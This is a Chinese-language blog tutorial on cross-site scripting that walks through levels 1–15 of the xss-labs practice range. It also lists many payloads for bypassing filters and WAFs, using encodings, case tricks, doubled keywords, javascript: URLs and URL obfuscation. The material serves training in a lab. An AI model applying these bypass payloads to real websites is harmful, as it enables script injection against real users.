---
title: "xss各种姿势的学习"
date: 2024-10-31
description: "搭建很简单，这里就不讲了。"
tags: []
---

靶场搭建

> [靶场下载地址：https://github.com/do0dl3/xss-labs](https://github.com/do0dl3/xss-labs)

搭建很简单，这里就不讲了。

> 这里也可以像我一样直接用别人搭建好的公共靶场：https://xssaq.com/。进入然后点击`游戏挑战`即可。不过因为是别人搭载的服务器，有可能会有加载过慢等等的问题，所以建议还是搭在本地练习。

# 个人重要总结

### 第一点：F12查看网络中的响应包、右键查看页面源代码和F12查看元素的区别


先来看F12查看网络中的响应包、右键查看页面源代码和F12查看元素的区别：

F12查看网络中的响应包：

<!-- img: /assets/images/posts/网安/漏洞专题/xss各种姿势的学习/001-image.jpg -->

右键查看页面源代码：

<!-- img: /assets/images/posts/网安/漏洞专题/xss各种姿势的学习/002-image.jpg -->

上面这两个都是一样的，查看的都是最原始的页面源代码。其中能正确判断闭合是用`'`单引号还是`"`双引号，输出点有没有被实体编码等等；

F12查看元素：这种无法正确判断闭合是用`'`单引号还是`"`双引号，输出点有没有被实体编码

<!-- img: /assets/images/posts/网安/漏洞专题/xss各种姿势的学习/003-image.jpg -->

所以这里总结出来一点，就是xss的时候，先输入`<a>666</a>`(用`<script>alert(1)</script>`来判断容易被发现)，然后优先看右键点击查看页面源代码，先判断闭合是要用`'`单引号还是`"`双引号，输出点有没有被实体编码等等，因为这个是最原始的页面源代码，也可以F12查看网络里的响应包，这两种是一样的；而F12查看元素是源代码 + 网页js渲染，有点不太一样，不是最原始的页面源代码。不过有时候这两个得结合在一起看。

```text-plain
右键查看页面源代码或F12查看网络中的响应包：就是别人服务器发送到浏览器的原封不动的代码，也就是最原始的代码。

(F12)检查元素：看到的就是最终的html代码。即：源代码 + 网页js渲染 。

【注】在源代码中找不到的代码，是在浏览器执行js动态生成的。
```

优先看右键点击查看页面源代码的原因：

这个是最原始的页面源代码。像level 3中value在F12中是`"`双引号闭合，而右键查看却是`'`单引号闭合，结果是`'`单引号闭合最后能成功；还有被实体编码了也是右键查看才能看的出来。

根据这些种种原因，还是优先看右键点击查看源代码的页面源代码，先把上面这些判断清楚，然后次看F12查看元素。不过有时候这两个得结合在一起看。

### 第二点：属性的属性值是否要加引号


属性名，像事件属性，比如`onclick`,`onerror`这样的，它们后面的属性值的引号可加可不加。比如`onerror=alert(1)`和`onerror="alert(1)"`都是可行的。不过如果没有把引号给过滤掉，能加最好还是要加。

而`src`属性的属性值要加引号，但是也不是必须的。像level 15关的`src`属性的属性值就必须要加引号才能成功；而像`<ImG sRc=1 onerRor=alert(1);>`这样在有的场合也能成功。所以一切还是要具体情况具体分析吧。

### 第三点：属性的属性值要加引号的话，引号不能重复


举例：

```text-plain
<img src="x" onerror="alert("1")";>不行，
<img src="x" onerror='alert("1")';>可以
```

### 第四点：单引号、双引号和反引号


如果是在html标签中，我们可以不用引号；如果是在javascript的函数中，我们可以用反引号代替单双引号。

举例：

```text-plain
<img src="1" onerror=alert(1);>可以，
<img src=`1` onerror=alert(1);>不行；

<img src="1" onerror='alert(1)';>可以，
<img src="1" onerror=`alert(1)`;>不行；

<img src="x" onerror=alert('1');>可以，
<img src="x" onerror=alert(`1`);>可以；
```

### 第五点：Javascript引擎特性和js代码中需要注意的点


js代码中，利用`空格`，`回车`，`tab键`，切记只有`""`包裹的js代码才可以随便利用`空格`，`回车`，`tab键`，比如`src="java script:xxxx"`，而这样不行：`src=java script:xxxx`。而且`回车`、`换行`不支持在`on事件`中使用，`空格`可以

Javascript引擎特性：Javascript语句通常以分号结尾，但是如果引擎判断一条语句完整的话，且结尾有换行符，就可以省略分号。

例：

```text-plain
var a = 1
var b = 2;
//上述语句都正确
```

# 绕过姿势

这里总结了些绕过姿势，无论在实战还是靶场中的学习都能用上。也可以看看这两篇文章：[XSS过滤绕过速查表](https://blog.csdn.net/weixin_50464560/article/details/114491500)，[XSS之绕过简单WAF总结](https://blog.csdn.net/weixin_50464560/article/details/119295255)

## 尖括号被HTML实体编码的情况

### onmouseover事件-当鼠标指针移动到指定对象的时候触发js

    '+οnmοuseοver='javascript:alert(1)

### onblur事件-事件会在对象失去焦点时触发js

    '+onblur=javascript:alert(1)

### onclick事件-当按钮被点击的时候触发js

    '+οnclick='alert(1)//
    '+onclick='javascript:alert(2)

### onfocus事件-当鼠标点击输入框且输入框被选中可以输入内容的时候触发js

    '+οnfocus='alert(1)
    '+onfocus='javascript:alert(2)

。。。

更多可以参考：[菜鸟教程-HTML DOM 事件](https://www.runoob.com/jsref/dom-obj-event.html)


## 空格被过滤的情况
------------

### 用`/`代替空格

```text-plain
<img/src="1"/onerror=alert(1);>
```

### 用回车符CR(%0d) 和换行符LF(%0a)取代空格

在HTML中`%0a`和`%0d`是可以当成空格使用的。

```text-plain
<img%0asrc='1'%0donerror=alert(1);>
```

## 关键字被过滤的情况
-------------

### 用`<svg>`标签

>(个人感觉比较少被过滤,起码比`<script>`标签少)

```text-plain
<svg onload="alert(1)">
```

基于像`<script>`标签这样被过滤的情况。`<img>`标签配合事件也行，不过基本都是配合`onerror`事件属性，别的事件更难触发，像`onclick`事件要触发还需要受害者点击等等，如果`onerror`事件属性被过滤了再考虑使用。下面也有大量用到。

### 注释符干扰绕过

html中的注释标签`<!-- 在此处写注释 -->`用于在 HTML 插入注释。

例如：`<!-- 在此处写注释 -->`

绕过例子：

`<scri<!--test-->pt>alert("hello world!")</scri<!--test-->pt>`

### 大小写绕过

```text-plain
<ImG sRc=1 onerRor=alert(1);>

<SvG OnlOad="alert(1)">
```

### 双写关键字（有限制）

有些waf可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字来绕过：

```text-plain
<imimgg srsrcc=x onerror=alert("xss");>
```

先判断哪些关键字被过滤，然后再试试双写它。还是要具体情况具体分析吧，如果waf不是只替换一次且是替换为空，可能就不行了

### 字符拼接

利用`eval`，这里反引号也可以用单引号、双引号

```text-plain
<img src="x" onerror="a=`aler`;b=`t`;c='(1);';eval(a+b+c)">

<svg onload="a=`aler`;b=`t`;c='(1);';eval(a+b+c)">
```

利用`top`，这里反引号也可以用单引号、双引号

```text-plain
<script>top[`al`+`ert`](1);</script>

<img src="x" onerror="top['al'+'ert'](1);">

<svg onload='top["al"+"ert"](1);'>
```

### 其它字符混淆

有的waf可能是用正则表达式去检测是否有xss攻击，如果我们能fuzz出正则的规则，那么我们就可以使用其它字符去混淆我们注入的代码了。  
下面举几个简单的例子：

```text-plain
可利用注释、标签的优先级等
1.<<script>alert(1);//<</script>
2.<title><img src=</title>><img src=x onerror="alert(`xss`);"> //因为title标签的优先级比img的高，所以会先闭合title，从而导致前面的img标签无效
3.<SCRIPT>var a="\\";alert(1);//";</SCRIPT>
```

### 编码绕过

#### 编码工具

这里推荐几个编码的网址：

[CTF编码](http://ctf.ssleye.com/)

[HTML字符实体转换](https://www.qqxiuzi.cn/bianma/zifushiti.php)

以下的payload都是实现弹窗，在用之前可自行在靶场判断是否可行。

#### HTML实体编码绕过

```text-plain
10进制实体编码：
<img src=1 onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#34;&#120;&#115;&#115;&#34;&#41;&#59;">

16进制实体编码：
<img src=1 onerror="&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x22;&#x78;&#x73;&#x73;&#x22;&#x29;&#x3B;">
```

#### Unicode编码绕过

```text-plain
<img src='a' onerror="eval('\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b')">
```

#### escape编码绕过

```text-plain
<img src="a" onerror="eval(unescape('%61%6c%65%72%74%28%22%78%73%73%22%29%3b'))">
```

#### ASCII码绕过

```text-plain
<img src="b" onerror="eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))">
```

#### 十六进制编码绕过

```text-plain
<img src=x onerror=eval('\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29')>
```

这里就是普通的十六进制编码转换，像`61`就是`a`转换过来的,`6c`是`l`,`65`是`e`，依次下去就是`alert('xss')`。只不过每个前面都要加`\x`，因为Javascript里`\x`开头的通常是16进制编码的数据。这里注意`\x`的`x`是小写不能大写。

#### 八进制编码绕过

```text-plain
<script>eval("\141\154\145\162\164\50\57\170\163\163\57\51");</script> 
```

这里转换的也是`alert('xss')`。具体过程是先将`a`转换ASCII码十进制为97，再转换成8进制就为141了。记得141前面要加`\`，因为Javascript里`\`开头的通常是8进制编码的数据。后面依此类推。

#### base64绕过

```text-plain
<img>标签举例：
<img src="c" onerror="eval(atob('ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw=='))">   //原payload为document.location='http://www.baidu.com'

<img src="c" onerror="eval(atob('YWxlcnQoInhzcyIp'))">

<iframe>标签举例：
<iframe/src=data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=></iframe>

<object>标签举例：
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=">img</object>
```

### Javascript伪协议的使用

例子：`<table background="javascript:alert(1)"></table>`。其中引号可以去掉  
支持Javascript伪协议的属性有：`img`,`href`,`lowsrc`,`bgsound`,`background`,`action`,`dynsrc`

### `""`包裹的js代码利用空格、回车、tab键

js代码中，利用`空格`，`回车`，`tab键`，切记只有`""`包裹的js代码才可以随便利用`空格`，`回车`，`tab键`，比如`src="java script:xxxx"`，而这样不行：`src=java script:xxxx`。而且`回车`、`换行`不支持在`on事件`中使用，`空格`可以

Javascript引擎特性：Javascript语句通常以分号结尾，但是如果引擎判断一条语句完整的话，且结尾有换行符，就可以省略分号。

例：

```text-plain
var a = 1
var b = 2;
//上述语句都正确
```

示例：`<img src="javas cript:alert(1)">`,中间为`tab键`

```text-plain
用于绕过某些XSS防护
<img src="jav   ascript:alert('XSS');">

    也可以对TAB编码
<img src="jav&#x09;ascript:alert('XSS');">

    利用换行符拆解
<img src="jav&#x0A;ascript:alert('XSS');">

    利用回车拆解
<img src="jav&#x0D;ascript:alert('XSS');">
```

## 双引号、单引号被过滤的情况
-----------------

### 用反引号绕过

如果是在html标签中，我们可以不用引号；如果是在javascript的函数中，我们可以用反引号代替单双引号。

举例：

```text-plain
<img src="1" onerror=alert(1);>可以，
<img src=`1` onerror=alert(1);>不行；

<img src="1" onerror='alert(1)';>可以，
<img src="1" onerror=`alert(1)`;>不行；

<img src="x" onerror=alert('1');>可以，
<img src="x" onerror=alert(`1`);>可以；
```

反引号绕过的例子：

```text-plain
<img src="x" onerror=alert(`xss`);>
```

### 编码绕过（具体看上面的）

使用编码绕过，具体看上面列举的那些，这里就不再赘述了

## 括号被过滤的情况
------------

### 用`throw`来绕过

```text-plain
<svg/onload="window.onerror=eval;throw'=alert\x281\x29';">
```


## url地址被过滤的情况
---------------

### 使用url编码

```text-plain
<img src="x" onerror=document.location=`http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d/`>
```

### 使用IP地址

以下都是跳转到`http://127.0.0.1`，需要用到这个：[IP地址计算器](http://ip.chacuo.net/ipcalc?_t=b1561938109)

下图是十六进制IP和十进制IP的绕过，十六进制IP加个`0x`：

<!-- img: /assets/images/posts/网安/漏洞专题/xss各种姿势的学习/004-image.jpg -->

1.十进制IP

```text-plain
<img src="x" onerror=document.location=`http://2130706433/`>
```

2.八进制IP

```text-plain
<img src="x" onerror=document.location=`http://0177.0.0.01/`>
```

3.十六进制IP

```text-plain
<img src="x" onerror=document.location=`http://0x7f.0x0.0x0.0x1/`>
```

### 用`//`代替`http://`

```text-plain
<img src="x" onerror=document.location=`//www.baidu.com`>
```

### 用`\\`代替`http://`（服务器是Linux系统可以绕过,Windows则不行）

```text-plain
要注意在windows中\本身就有特殊用途，是一个path的写法，所以\\在Windows下是file协议，在linux中才会是当前域的协议
```

在Windows中：

输入`\\www.baidu.com`，它就已经提示我会变成`file://www.baidu.com`

<!-- img: /assets/images/posts/网安/漏洞专题/xss各种姿势的学习/005-image.jpg -->

访问便提示我没有这个文件

<!-- img: /assets/images/posts/网安/漏洞专题/xss各种姿势的学习/006-image.jpg -->

而输入`\\D:/phpStudy/PHPTutorial/WWW/phpinfo.php`，就访问了我D盘中的这个phpinfo.php文件

<!-- img: /assets/images/posts/网安/漏洞专题/xss各种姿势的学习/007-image.jpg -->

在Linux中：

输入`\\www.baidu.com`

可以跳转到`https://www.baidu.com`，即百度


<!-- img: /assets/images/posts/网安/漏洞专题/xss各种姿势的学习/009-image.jpg -->

### 用`。`中文句号代替`.`英文句号

如果你在你在域名中输入`。`中文的句号，浏览器会自动转化成`.`英文的句号

```text-plain
<img src="x" onerror="document.location=`http://www。baidu。com`">  //会自动跳转到百度
```
# XSS-labs靶场实例

## level 1：直接构造

过程
------

第一关很简单。是get请求，提交name参数值为xi，完整的显示在返回的页面源代码中：

<!-- img: /assets/images/posts/网安/漏洞专题/xss各种姿势的学习/010-image.jpg -->

那么我们把值xi改成`<script>alert(1)</script>`，即可成功弹框，那么我们也就成功了：

<!-- img: /assets/images/posts/网安/漏洞专题/xss各种姿势的学习/011-image.jpg -->

后台源代码分析
-----------

通过`$_GET["name"]`，获取`name`的值，没有过滤通过`echo`直接进行了输出

<!-- img: /assets/images/posts/网安/漏洞专题/xss各种姿势的学习/012-image.jpg -->

## level 2：双引号尖括号闭合

过程
------

这里我们在搜索框输入`<script>alert(1)</script>`，可以发现其回显在了页面上，但是却没有弹框。这里可以看到标红的第1个点处我们的payload变成黑色了，那么第1个点肯定没希望了。

<!-- img: /assets/images/posts/网安/漏洞专题/xss各种姿势的学习/013-image.jpg -->

这里再多放一个右键点击查看源代码的图，从这里我们才能看出来端倪，其中第一个点的尖括号是被实体编码了。F12看元素看不出来第一个点的尖括号是被实体编码了：

<!-- img: /assets/images/posts/网安/漏洞专题/xss各种姿势的学习/014-image.jpg -->

从这里我们可以看出右键点击查看源代码和F12检查元素查看页面源代码有些许不同：

```text-plain
右键查看页面源代码或F12查看网络中的响应包：就是别人服务器发送到浏览器的原封不动的代码，也就是最原始的代码。

(F12)检查元素：看到的就是最终的html代码。即：源代码 + 网页js渲染 。

【注】在源代码中找不到的代码，是在浏览器执行js动态生成的。
```

那么这里回到上面标红的第2个点，第2个点会把我们输入的payload原封不动、不进行过滤的变成keyword的value。那么这里我们把前面的`"`和input标签闭合：`"><script>alert(1)</script>`，即可成功

后台源代码分析
-----------

<!-- img: /assets/images/posts/网安/漏洞专题/xss各种姿势的学习/015-image.jpg -->

`echo`的时候，采用`htmlspecialchars`函数把预定义的字符转换为 HTML 实体；然而获取浏览器提交的keyword值，未进行如此转换，输出在`<input name=keyword value="'.$str.'">`。

如果是keyword提交的是`<script>alert(1)</script>`,返回的就会是`<input name=keyword value="<script>alert(1)</script>">`,javascript引擎并不会执行`<script>`,所以需要构造闭合。

keyword提交`test"><script>alert(1)</script>//`,php处理后返回的html就会是`<input name=keyword value="test"> <script>alert(1)</script>//">`，//是注释的作用，javascript引擎执行`<script>alert(1)</script>`，最后成功

## level 3：事件绕过和单引号闭合

过程
------

输入payload`"><script>alert(1)</script><`，不能成功，F12看元素还是这两个点，第2个点还是可以插入我们输入的值，但是却不能成功

<!-- img: /assets/images/posts/网安/漏洞专题/xss各种姿势的学习/016-image.jpg -->

那么依旧右键查看原始的页面源代码，才可以看出来这里两个点的尖括号都被实体编码了，而且value是`'`单引号闭合；而F12中是`"`双引号闭合的：

<!-- img: /assets/images/posts/网安/漏洞专题/xss各种姿势的学习/017-image.jpg -->

那么这里构造事件来触发xss：`' onclick='alert(1)`，这里我们通过右键查看原始的页面源代码也才能看出来是`'`单引号才能闭合成功：

<!-- img: /assets/images/posts/网安/漏洞专题/xss各种姿势的学习/018-image.jpg -->

最后再点击一下框就成功了：

<!-- img: /assets/images/posts/网安/漏洞专题/xss各种姿势的学习/019-image.jpg -->

后台源代码分析
-----------

<!-- img: /assets/images/posts/网安/漏洞专题/xss各种姿势的学习/020-image.jpg -->

采用`htmlspecialchars`函数对获取keyword参数中预定义的字符转换为 HTML 实体，输出在input标签的value中。`htmlspecichars`对尖括号进行了实体编码。

## level 4：事件绕过和双引号闭合

过程
------

这一关和level 3类似，只不过右键查看原始的页面源代码是双引号闭合，所以构造payload:`" onclick="alert(1)`，最后再点击一下框就成功了。

后台源代码分析
-----------

<!-- img: /assets/images/posts/网安/漏洞专题/xss各种姿势的学习/021-image.jpg -->

对get请求的keyword参数，用`str_replace()`函数过滤掉尖括号，返回给keyword的值；采用`htmlspecialchars`函数把预定义的字符转换为 HTML 实体后用echo直接输出在返回的html中。

## level 5：javascript伪协议绕过

过程
------

先右键查看原始的页面源代码，发现是双引号闭合，输入尖括号发现第一个输出点被实体编码，而第二个输出点没被实体编码，构造payload`"><scirpt>alert(1)</script><`，这时用F12查看，发现变成这样：

<!-- img: /assets/images/posts/网安/漏洞专题/xss各种姿势的学习/022-image.jpg -->

明显不行。这时再构造payload`" onclick="alert(1)`，发现返回的html代码对on进行了过滤。

那么这里利用没有过滤尖括号，构造a标签再尝试利用a标签的href属性执行javascript伪协议，payload：`"><a href='javascript:alert(1)'>`,没有对javascript伪协议进行过滤，对其进行点击，触发xss  
 

<!-- img: /assets/images/posts/网安/漏洞专题/xss各种姿势的学习/023-image.jpg -->

后台源代码分析
-----------

对get提交的keyword参数，`script`替换成`scr_ipt`,`on`替换成`o_n`，`htmlspecialchars`函数把预定义的字符转换为 HTML 实体后，输出在html中  
 

<!-- img: /assets/images/posts/网安/漏洞专题/xss各种姿势的学习/024-image.jpg -->

## level 6：事件或javascript伪协议大小写绕过

过程
------

先右键查看原始的页面源代码，发现是双引号闭合，经测试替换了`script`，`on`，没有过滤`<>`。构造a标签，利用href属性支持javascript伪协议构造payload，可是后台对href关键字进行替换。那么这里用大小写来绕过：`"><a Href='javascript:alert(1)'>`，然后手动点击

还有可以on大小写绕过：`" Onclick="alert(1)`，记得搜索完要手动点击下框才能成功

后台源代码分析
-----------

<!-- img: /assets/images/posts/网安/漏洞专题/xss各种姿势的学习/025-image.jpg -->

对get提交的keyword参数，`str_replace`函数替换`<script`、`on`、`src`、`data`、`href`关键字，采用`htmlspecialchars`函数把预定义的字符转换为 HTML 实体后输出在html中

## level 7：javascript伪协议双写绕过

过程
------

先右键查看原始的页面源代码，发现是双引号闭合，构造`"><a href='javascript:alert(1)'>`，根据返回的html，发现过滤了`href`和`script`。尝试大小写不能进行绕过。

<!-- img: /assets/images/posts/网安/漏洞专题/xss各种姿势的学习/026-image.jpg -->

那么这里尝试双写绕过：`"><a hhrefref='javasscriptcript:alert(1)'>`，然后点击，成功绕过触发xss

后台源代码分析
-----------

先将get方式提交的keyword参数通过`strtolower`函数转换为小写，`str_replace`函数将关键字`script`、`on`、`src`、`data`、`href`关键字替换成空，然后输出在html中

<!-- img: /assets/images/posts/网安/漏洞专题/xss各种姿势的学习/027-image.jpg -->

## level 8：javascript伪协议实体编码绕过

过程
------

这里可以看到有个友情链接，那么本身就有a标签href属性了。像下面点击友情链接就能跳转到百度了。

<!-- img: /assets/images/posts/网安/漏洞专题/xss各种姿势的学习/028-image.jpg -->

想到可以调用外部js，但事实并没那么简单，因为完成目标需要在本页面弹窗，才会显示输出，并跳转到下一关。因为这里是先添加一个链接，再打开这个链接，会打开另一个界面，就不在本界面弹窗，所以外部调用不可行，那么只能用javascript伪协议。

那么这里直接写javascript伪协议：`javascript:alert(1)`，右键查看原始的页面源代码和F12其实都能看出来变成了`javascr_ipt:alert(1)`，那么应该是javascript关键字被替换了。那么这里尝试大小写，双写，是都无法进行绕过的。

那我们只有尝试编码绕过了，用实体编码可绕过：

```text-plain
十进制实体编码：javascrip&#116;:alert(1)
十六进制实体编码：javascrip&#x74;:alert(1)
都是将t字符进行实体编码，当然对其他字符进行编码也可以，目的在于绕过服务端的匹配。客户端解析时又会将其转码为t，从而弹窗
```

两种选一种输入，然后点击便能成功

后台源代码分析
-----------

<!-- img: /assets/images/posts/网安/漏洞专题/xss各种姿势的学习/029-image.jpg -->

先将get方式提交的keyword参数通过`strtolower`函数转换为小写，用`htmlspecialchars`函数把预定义的字符转换为 HTML 实体，`str_replace`函数替换关键字`script`、`on`、`src`、`data`、`href`、`"`，然后输出在a标签的href属性中。

## level 9：javascript伪协议实体编码 + 注释符`//`绕过

过程
------

这里发现还是有友情链接，那么用level 8的payload，href里直接显示链接不合法，测试发现输入中必须包含`http://`

那么我们用注释符`//`绕过即可。构造payload,这边有两种方法：

```text-plain
十进制实体编码：javascrip&#116;:alert(1)//http://127.0.0.1		
十六进制实体编码：javascrip&#x74;:alert(1)//http://127.0.0.1		
```

也可以直接这样：

```text-plain
十进制实体编码：javascrip&#116;:alert('http://127.0.0.1')
十六进制实体编码：javascrip&#x74;:alert('http://127.0.0.1')
```

然后点击就成功了

后台源代码分析
-----------

<!-- img: /assets/images/posts/网安/漏洞专题/xss各种姿势的学习/030-image.jpg -->

先将get方式提交的keyword参数通过`strtolower`函数转换为小写，get提交的keyword参数用`htmlspecialchars`函数把预定义的字符转换为 HTML 实体，`str_replace`函数替换关键字`script`、`on`、`src`、`data`、`href`、`"`，判断该变量有无http://

## level 10：隐藏表单用GET方式自己创建text文本框配合事件绕过

过程
------

keywordget传的参数值输入`<script>alert(1)</script>`，右键查看原始的页面源代码发现输出的地方进行了html实体编码，一时间不知道该如何解决。我感觉也只有这一个输出点了：

<!-- img: /assets/images/posts/网安/漏洞专题/xss各种姿势的学习/031-image.jpg -->

然后再详细查看页面源代码，发现可能有隐藏的表单，尝试提交t\_link、t\_history、t\_sort参数：`?keyword=<script>alert(1)</script>&t_link=<script>alert(1)</script>&t_history=<script>alert(1)</script>&t_sort=<script>alert(1)</script>`，最后发现只有t\_sort参数接收了并返回在了html的value中：

<!-- img: /assets/images/posts/网安/漏洞专题/xss各种姿势的学习/032-image.jpg -->

只不过其中的尖括号被过滤了。也发现了是用`"`双引号闭合。那么构造payload：

```text-plain
?t_sort="type="text" onclick="alert(1)"><  //因为页面中没有触发事件框，所以type="text"构造一个文本框
```

然后页面会出现一个框，点击它，成功

后台源代码分析
-----------

<!-- img: /assets/images/posts/网安/漏洞专题/xss各种姿势的学习/033-image.jpg -->

获取了get请求的keyword参数、t\_sort参数，t\_sort参数的键值也是可定义的，t\_sort参数过滤掉了尖括号，输出在value属性中。

## level 11：隐藏表单用Referer字段自己创建text文本框配合事件绕过

过程
------

这一关和level 10相似，也是隐藏表单，只不过这里是有两个参数可以接收并返回在了html的value中，分别是t\_sort参数和t\_ref参数，但是t\_sort参数输入level 10的payload：`?t_sort="type="text" onclick="alert(1)"><`时，右键查看原始的页面源代码发现`"`双引号和尖括号都给实体编码了：

<!-- img: /assets/images/posts/网安/漏洞专题/xss各种姿势的学习/034-image.jpg -->

这里应该是用了`htmlspecialchars`函数把预定义的字符转换为 HTML 实体，没什么希望了。那么来看看t\_ref参数：

t\_ref参数接收了并返回在了html的value中，而且不是像t\_sort参数那样以get方式来获取值，而是获取http头里的Referer字段。

那么这里就要用到burpsuite来抓包了：

payload：`Referer:"type="text" onclick="alert(1)"><`

<!-- img: /assets/images/posts/网安/漏洞专题/xss各种姿势的学习/035-image.jpg -->

这里有个疑惑：经过测试，`Referer`字段加在最后一行即`Accept-Language`字段下面一行就不能成功，而其它地方都是可以成功的。如果知道的人可以指教一下~

然后页面会生成一个框，点它，成功

<!-- img: /assets/images/posts/网安/漏洞专题/xss各种姿势的学习/036-image.jpg -->

后台源代码分析
-----------

<!-- img: /assets/images/posts/网安/漏洞专题/xss各种姿势的学习/037-image.jpg -->

获取get请求的keyword、t\_sort参数和`Referer`字段，get提交的t\_sort参数用`htmlspecialchars`函数把预定义的字符转换为 HTML 实体、过滤`Referer`字段的尖括号后输出在html代码中

## level 12：隐藏表单用User-Agent字段自己创建text文本框配合事件绕过

过程
------

这一关和level 11相似，也是隐藏表单，这里也是有两个参数可以接收并返回在了html的value中，分别是t\_sort参数和t\_ua参数。关于t\_sort参数的分析和level 11的一样，具体可看level 11。

那么这里来看看t\_ua参数：

t\_ua参数接收了并返回在了html的value中，而且不是像t\_sort参数那样以get方式来获取值，而是获取http头里的`User-Agent`字段。

那么这里就要用到burpsuite来抓包了：

payload：`User-Agent:"type="text" onclick="alert(1)"><`

<!-- img: /assets/images/posts/网安/漏洞专题/xss各种姿势的学习/038-image.jpg -->

然后页面会生成一个框，点它，成功

后台源代码分析
-----------

<!-- img: /assets/images/posts/网安/漏洞专题/xss各种姿势的学习/039-image.jpg -->

获取get请求的keyword、t\_sort变量和`User-Agent`字段，get提交的t\_sort参数用`htmlspecialchars`函数把预定义的字符转换为 HTML 实体、过滤`User-Agent`字段的尖括号后输出在html代码中

## level 13：隐藏表单用Cookie字段自己创建text文本框配合事件绕过

过程
------

这一关和level 11相似，也是隐藏表单，这里也是有两个参数可以接收并返回在了html的value中，分别是t\_sort参数和t\_cook参数。关于t\_sort参数的分析和level 11的一样，具体可看level 11。

那么这里来看看t\_cook参数：

t\_cook参数接收了并返回在了html的value中，而且不是像t\_sort参数那样以get方式来获取值，而是获取http头里的`Cookie`字段中user的cookie值。

这里先来简单介绍下cookie的机制：

当用户第一次访问并登陆一个网站的时候，cookie的设置以及发送会经历以下4个步骤：

客户端发送一个请求到服务器\--> 服务器发送一个HttpResponse响应到客户端，其中包含Set-Cookie的头部\--> 客户端保存cookie，之后向服务器发送请求时，HttpRequest请求中会包含一个Cookie的头部\-->服务器返回响应数据

那么这里就要用到burpsuite来抓包了：

这里我们首先把Proxy里抓到的请求包发送到Intruder里，这时候可以看到请求包这里还没有cookie。然后服务器发送一个HttpResponse响应到客户端，其中包含`Set-Cookie`的头部

<!-- img: /assets/images/posts/网安/漏洞专题/xss各种姿势的学习/040-image.jpg -->

然后这时候再把Proxy里的包都放(Forward)了，然后再用burp重新拦截，再刷新下网站，这时候我们的请求包里才有了Cookie字段：`Cookie: user=call+me+maybe%3F`。然后改成下面的payload:

payload：`Cookie:user="type="text" onclick="alert(1)"><`

<!-- img: /assets/images/posts/网安/漏洞专题/xss各种姿势的学习/041-image.jpg -->

放包后，然后页面会生成一个框，点它，成功

后台源代码分析
-----------

<!-- img: /assets/images/posts/网安/漏洞专题/xss各种姿势的学习/042-image.jpg -->

获取get请求的keyword、t\_sort变量和`Cookie`字段中user的cookie值，get提交的t\_sort参数用`htmlspecialchars`函数把预定义的字符转换为 HTML 实体、过滤`Cookie`字段中user的cookie值的尖括号后输出在html代码中

## level 14：exif xss(上传一个含有xss代码的图片触发xss)

过程
------

这一关先查看页面源码，通过`iframe`标签引入了一个`http://exofvoewer.org`。因为`iframe`调用的文件地址访问失败，已经无法进行测试了。

<!-- img: /assets/images/posts/网安/漏洞专题/xss各种姿势的学习/043-image.jpg -->

<!-- img: /assets/images/posts/网安/漏洞专题/xss各种姿势的学习/044-image.jpg -->

结合网上师傅们的文章，了解到这关主要考察的是`exif xss`漏洞，一般利用于文件上传的地方，最经典的就是头像上传，上传一个图片，该图片的`exif`元数据被修改为xss的payload,成功利用弹框。

具体实现可以使用kali下的`exiftool`工具，命令如下：

```text-plain
exiftool -FIELD=XSS FILE

exiftool -Artist=’ “><img src=1 οnerrοr=alert(document.domain)>’ brute.jpeg
```

这里可以参考这位师傅的文章：https://xz.aliyun.com/t/1206?accounttraceid=74ab404d-2a01-4a1c-8b87-36ad367dbe11#toc-12，这里为了方便直接截取文章中的图片

其实以前乌云就爆出个这个`exif xss`漏洞，上传一个含有xss代码的图片触发xss。

`exif xss`：

<!-- img: /assets/images/posts/网安/漏洞专题/xss各种姿势的学习/045-image.jpg -->

<!-- img: /assets/images/posts/网安/漏洞专题/xss各种姿势的学习/046-image.jpg -->

<!-- img: /assets/images/posts/网安/漏洞专题/xss各种姿势的学习/047-image.jpg -->

<!-- img: /assets/images/posts/网安/漏洞专题/xss各种姿势的学习/048-image.jpg -->

后台源代码分析
-----------

```text-plain
<html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<title>欢迎来到level 14</title>
</head>
<body>
<h1 align=center>欢迎来到level 14</h1>
<center><iframe name="leftframe" marginwidth=10 marginheight=10 src="http://www.exifviewer.org/" frameborder=no width="80%" scrolling="no" height=80%></iframe></center><center>这关成功后不会自动跳转。成功者<a href=/xss/level 15.php?src=1.gif>点我进level 15</a></center>
</body>
</html>
```

这一关的后台源代码其实就是原始的页面源代码了，在上面过程也有总结，这里就不赘述了。

## level 15：ng-include包含同一域名下有xss漏洞的文件来触发xss

过程
------

这一关提示让我自己走出去。这里看来只能在url里面操作了。url中发现了`src`参数，我修改`src=javascript:alert(1)`，回车后，右键查看原始的页面源代码，发现它把`src`的参数值拼接到了最后一行`<body><span class="ng-include:javascript:alert(1)"></span></body>`里输出。

<!-- img: /assets/images/posts/网安/漏洞专题/xss各种姿势的学习/049-image.jpg -->

这里使用了`ng-include`属性，这里来介绍一下：

`AngularJS`中的`ng-include`指令:

```text-plain
ng-include指令用于包含外部的 HTML 文件。

包含的内容将作为指定元素的子节点。

ng-include属性的值可以是一个表达式，返回一个文件名。

默认情况下，包含的文件需要包含在同一个域名下。
```

那么这里就用包含同一个域名下有xss漏洞的文件，触发xss。这里需要注意一点：这里一定要访问上面的`angular.min.js`这个js文件，才能进行包含。

那么这里来构造payload：`?src='http://同一域名/xss-labs-master/level 1.php?name=<img src=1 onerror=alert(1)>'`

也可以是`?src='level 1.php?name=<img src=1 onerror=alert(1)>'`

<!-- img: /assets/images/posts/网安/漏洞专题/xss各种姿势的学习/050-image.jpg -->

后台源代码分析
-----------

<!-- img: /assets/images/posts/网安/漏洞专题/xss各种姿势的学习/051-image.jpg -->

`ng-include`属性采用`htmlspecialchars`函数对获取的src参数中的预定义的字符转换为 HTML 实体。

